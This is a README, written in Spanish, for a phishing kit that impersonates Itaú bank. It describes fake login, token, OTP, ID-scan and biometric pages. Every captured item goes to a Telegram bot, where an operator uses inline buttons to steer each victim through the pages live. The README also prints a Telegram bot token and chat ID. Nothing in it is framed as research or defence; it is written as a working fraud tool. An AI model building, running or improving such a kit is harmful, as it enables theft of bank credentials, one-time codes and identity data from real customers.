# Sistema Itaú Banking

Sistema completo de captura de datos bancarios con integración a Telegram Bot API y Socket.io para comunicación en tiempo real.

## 🏗️ Arquitectura

### Frontend
- **index.html**: Página de login principal
- **correo.html**: Verificación de correo electrónico
- **token.html**: Captura de token de seguridad (8 dígitos con expiración de 60 segundos)
- **otp.html**: Código OTP enviado vía SMS
- **cara.html**: Página de validacion biometrica
- **cedula.html**: Página de escaneo de cedula
- **finalizar.html**: Página de error técnico
- **recuperar.html**: Recuperación de clave

### Backend
- **server.js**: Servidor Express con Socket.io y integración Telegram Bot API
- **package.json**: Dependencias del proyecto
- **.env**: Variables de entorno (tokens y configuración)

## 📦 Instalación

1. Instalar Node.js (si no está instalado)

2. Instalar dependencias:
```bash
npm install
```

## 🚀 Ejecución

### Modo Producción
```bash
npm start
```

### Modo Desarrollo (con auto-reload)
```bash
npm run dev
```

El servidor se ejecutará en: `http://localhost:3000`

## 🔧 Configuración

Las credenciales de Telegram ya están configuradas en `.env`:
- Bot Token: `8594518856:AAEQtZywbIFEySmk9UtwPdAjup5bCGdw864`
- Chat ID: `-5018838947`
- Puerto: `3000`

## 🔄 Flujo de Trabajo

1. **Login (index.html)**:
   - Usuario ingresa tipo de documento, número y clave
   - Al enviar, muestra overlay de carga
   - Datos se envían a Telegram con 5 botones

2. **Comandos Telegram**:
   - 🔄 **Pedir Logo**: Redirige a index.html y limpia datos
   - 📧 **Pedir Correo**: Redirige a correo.html
   - 🎫 **Pedir Token**: Redirige a token.html
   - 📱 **Pedir OTP**: Redirige a otp.html
   - 🪙 **Pedir Cédula**: Redirige a cedula.html
   - 👤 **Pedir Cara**: Redirige a biometria.html
   - ✅ **Finalizar**: Redirige a finalizar.html
   

3. **Captura de Datos Adicionales**:
   - Cada página envía datos a Telegram
   - Mantiene overlay de carga hasta recibir comando
   - Toda la sesión se rastrea por Socket.io

## 🛠️ Tecnologías

- **Frontend**: HTML5, CSS3, JavaScript vanilla
- **Backend**: Node.js, Express
- **Real-time**: Socket.io
- **Bot**: node-telegram-bot-api
- **Configuración**: dotenv

## 📱 Características

✅ Overlay de carga animado
✅ Validación en tiempo real
✅ Solo números en documento
✅ Letras y números en clave
✅ Token con expiración de 60 segundos
✅ Integración completa con Telegram
✅ Botones inline en Telegram
✅ Manejo de sesiones por Socket.io
✅ Arquitectura limpia y escalable
✅ Código organizado y comentado

## 🎨 Diseño

- Colores corporativos Itaú
- Responsive design
- Animaciones suaves
- UX optimizada

## ⚠️ Notas Importantes

- El servidor debe estar corriendo para que funcione la comunicación Socket.io
- El bot de Telegram debe estar activo (polling)
- Las sesiones se mantienen por 5 minutos después de desconexión
- Todos los campos tienen validación client-side y server-side

## 📝 Estructura de Mensajes Telegram

Cada mensaje incluye:
- Sesión ID única
- Fecha y hora
- Todos los datos capturados hasta el momento
- Botones de acción inline

## 🔐 Seguridad

- Variables sensibles en .env
- Sesiones por Socket.io con IDs únicos
- Validación de datos en cliente y servidor
- Limpieza automática de sesiones inactivas
